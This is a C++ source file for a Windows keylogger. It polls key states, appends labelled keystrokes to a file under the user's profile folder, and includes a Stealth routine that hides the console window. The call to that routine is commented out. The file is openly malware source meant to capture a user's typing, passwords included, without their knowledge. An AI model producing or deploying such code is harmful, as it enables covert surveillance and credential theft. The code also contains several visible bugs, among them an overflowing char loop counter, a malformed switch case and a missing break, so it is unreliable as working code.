#include <iostream>
#include <Windows.h>
#include <string>
#include <winuser.h>
#include <fstream>

/// <summary>
/// Function to save the logs
/// </summary>
/// <param name="key_stroke">key</param>
/// <param name="file">output file</param>
/// <returns></returns>
int SaveLogs(int key_stroke, const char* file);
/// <summary>
/// Function to hidden the keylogger
/// </summary>
void Stealth();

/// <summary>
/// Main
/// </summary>
/// <returns></returns>
int main() 
{
	//Stealth();
	char i;
	const char* userProfile = std::getenv("USERPROFILE");

	//userProfile += "\\log.txt";

	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				SaveLogs(i, userProfile);
			}
		}
	}
}

/// <summary>
/// Function to save the logs
/// </summary>
/// <param name="key_stroke">key</param>
/// <param name="file">output file</param>
/// <returns></returns>
int SaveLogs(int key_stroke, const char* file)
{
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0;
	}

	FILE* OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a");

	printf(key_stroke + "\n");

	switch (key_stroke)
	{
		case 8:
			fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
			break;
		case 13:
			fprintf(OUTPUT_FILE, "%s", "n");
			break;
		case 32:
			fprintf(OUTPUT_FILE, "%s", " ");
			break;
		case VK_TAB:
			fprintf(OUTPUT_FILE, "%s", "[TAB]");
			break;
		case VK_SHIFT:
			fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
			break;
		case VK_CONTROL:
			fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
			break;
		case VK_ESCAPE:
			fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
			break;
		case VK_END:
			fprintf(OUTPUT_FILE, "%s", "[END]");
			break;
		case VK_HOME:
			fprintf(OUTPUT_FILE, "%s", "[HOME]");
			break;
		case VK_LEFT:
			fprintf(OUTPUT_FILE, "%s", "[LEFT]");
			break;
		case VK_UP:
			fprintf(OUTPUT_FILE, "%s", "[UP]");
			break;
		case VK_RIGHT:
			fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
			break;
		case VK_DOWN:
			fprintf(OUTPUT_FILE, "%s", "[DOWN]");
			break;
		case 190 || 110:
			fprintf(OUTPUT_FILE, "%s", ".");
		default:
			fprintf(OUTPUT_FILE, "%c", (char)key_stroke);
			break;
	}
	fclose(OUTPUT_FILE);
	return 0;
}

/// <summary>
/// Stealth function
/// </summary>
void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}